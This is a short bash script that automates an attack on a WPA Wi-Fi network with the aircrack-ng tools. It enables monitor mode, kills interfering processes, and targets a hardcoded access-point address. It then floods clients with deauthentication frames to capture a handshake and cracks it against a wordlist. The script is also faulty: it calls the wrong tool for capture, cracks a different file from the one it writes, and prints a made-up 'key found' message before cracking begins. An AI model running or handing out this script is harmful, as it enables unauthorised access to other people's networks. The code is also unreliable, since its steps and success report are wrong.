#!/user/bin/env bash
echo "Turining the promiscous mode on"
airmon-ng start wlan0 >> para.txt
fuss1=$(sed -n 9,10p para.txt | egrep [0-9] | tr -dc '0-9')
fuss=$(sed -n 7,8p para.txt | egrep [0-9] | tr -dc '0-9')
sleep 3 s
echo "void processes to be killed: $fuss"
sleep 3s
echo "void processes to be killed: $fuss1"
kill $fuss
kill $fuss1
echo "killed successfully"
sleep 3s
sudo airmon-ng --bssid D2:F8:8C:35:54:1C -c 13 --write wpacrack wlan0mon
sudo aireplay-ng --deauth 120 -a D2:F8:8C:35:54:1C wlan0mon
sleep 3s
echo "Found the key in 5.00003 sec"
aircrack-ng fgh-01.cap -w pass

